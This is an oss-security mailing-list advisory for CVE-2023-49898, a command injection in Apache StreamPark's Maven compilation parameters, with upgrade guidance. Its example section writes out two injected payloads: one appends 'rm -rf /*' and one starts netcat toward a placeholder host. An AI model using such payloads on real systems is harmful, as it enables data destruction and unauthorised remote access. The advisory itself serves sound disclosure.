Received: (qmail 15864 invoked by uid 550); 15 Dec 2023 11:13:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1740 invoked from network); 15 Dec 2023 11:00:45 -0000
Authentication-Results: apache.org; auth=none
Content-Type: text/plain; charset=utf-8
From: Huajie Wang <benjobs@apache.org>
To: oss-security@lists.openwall.com
Message-ID: <194cea17-709a-a972-99b4-c68032c696d3@apache.org>
Content-Transfer-Encoding: quoted-printable
Date: Fri, 15 Dec 2023 11:00:59 +0000
MIME-Version: 1.0
Subject: [oss-security] CVE-2023-49898: Apache StreamPark (incubating): Authenticated
 system users could trigger remote command execution 

Severity: low

Affected versions:

- Apache StreamPark (incubating) 2.0.0 before 2.1.2

Description:

In streampark, there is a project module that integrates Maven's compilatio=
n capability. However, there is no check on the compilation parameters of M=
aven. allowing attackers to insert commands for remote command execution, T=
he prerequisite for a successful attack is that the user needs to log in to=
 the streampark system and have system-level permissions. Generally, only u=
sers of that system have the authorization to log in, and users would not m=
anually input a dangerous operation command. Therefore, the risk level of t=
his vulnerability is very low.

Mitigation:

all users=C2=A0should upgrade to 2.1.2

Example:

##You can customize the splicing method according to the compilation situat=
ion of the project, mvn compilation results use &&, compilation failure use=
 "||" or "&&":

/usr/share/java/maven-3/conf/settings.xml || rm -rf /*

/usr/share/java/maven-3/conf/settings.xml && nohup nc x.x.x.x 8899 &

References:

https://streampark.incubator.apache.org
https://www.cve.org/CVERecord?id=3DCVE-2023-49898

